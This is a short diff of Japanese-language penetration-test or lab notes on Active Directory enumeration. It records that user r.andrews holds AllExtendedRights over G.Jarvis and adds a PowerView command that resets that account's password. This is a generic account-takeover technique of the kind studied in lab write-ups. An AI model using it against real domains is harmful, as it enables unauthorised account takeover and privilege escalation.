@@ -307,10 +307,13 @@ cmdkey ->なし
 
 - AS-REP roastable、Kerberoastableは両方存在しない
 
-- r.andrewsは、G.Jarvisに"AllExtendedRights"をもつ
-
+- r.andrewsは、G.Jarvisに"AllExtendedRights"をもつため、パスワード変更が可能
 ![[Pasted image 20260222163423.png]]
 
+```powershell
+$NewPassword = ConvertTo-SecureString "<new_pw>" -AsPlainText -Force
+Set-DomainUserPassword -Identity "<Target_UserDN>" -AccountPassword $NewPassword
+```
 
 
 
